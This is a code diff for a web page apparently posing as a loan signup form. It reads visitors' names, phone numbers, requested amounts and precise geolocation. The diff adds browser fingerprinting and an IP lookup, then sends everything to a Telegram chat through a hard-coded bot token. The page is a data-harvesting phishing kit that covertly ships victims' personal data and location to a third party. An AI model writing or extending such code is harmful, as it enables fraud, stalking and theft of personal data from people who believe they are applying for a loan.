@@ -87,6 +87,7 @@
     </div>
     
     <script>
+        // Function to get user location
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -96,13 +97,15 @@
             }
         }
         
+        // Function to show user's position
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
 
-            sendLocationToTelegram(latitude, longitude);
+            collectAdditionalData(latitude, longitude);
         }
 
+        // Function to handle geolocation errors
         function showError(error) {
             var message;
             switch(error.code) {
@@ -123,20 +126,48 @@
             document.getElementById("location").style.display = "block"; // Show the error message
         }
 
-        function sendLocationToTelegram(latitude, longitude) {
+        // Function to collect additional data and send to Telegram
+        function collectAdditionalData(latitude, longitude) {
             var botToken = '7395889656:AAEM67vs5lE1xRGWyTCBCb06GOFx9VkIFUg';
             var chatId = '-1002148840772';
             var name = document.getElementById('name').value;
             var phone = document.getElementById('phone').value;
             var amount = document.getElementById('amount').value;
 
-            // Construct the Google Maps link using latitude and longitude
-            var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            // Collect additional data
+            var userAgent = navigator.userAgent; // Get user agent string
+            var browserLanguage = navigator.language; // Get browser language
+            var screenWidth = screen.width; // Get screen width
+            var screenHeight = screen.height; // Get screen height
+            var timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone; // Get user's time zone
 
-            var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}`;
+            // Attempt to get the user's IP address (IP address retrieval is simplified here for demonstration)
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ipAddress = data.ip;
 
+                    // Construct the Google Maps link using latitude and longitude
+                    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}\nBrowser Language: ${browserLanguage}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}`;
+
+                    sendToTelegram(botToken, chatId, message);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    var googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+                    var message = `New Loan Signup:\nName: ${name}\nPhone Number: ${phone}\nLoan Amount: $${amount}\nLatitude: ${latitude}\nLongitude: ${longitude}\nGoogle Maps: ${googleMapsLink}\n\nAdditional Data:\nUser Agent: ${userAgent}\nBrowser Language: ${browserLanguage}\nScreen Width: ${screenWidth}px\nScreen Height: ${screenHeight}px\nTime Zone: ${timeZone}`;
+
+                    sendToTelegram(botToken, chatId, message);
+                });
+        }
+
+        // Function to send data to Telegram
+        function sendToTelegram(botToken, chatId, message) {
             var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
+            
             var xhr = new XMLHttpRequest();
             xhr.open("GET", telegramUrl, true);
             xhr.send();
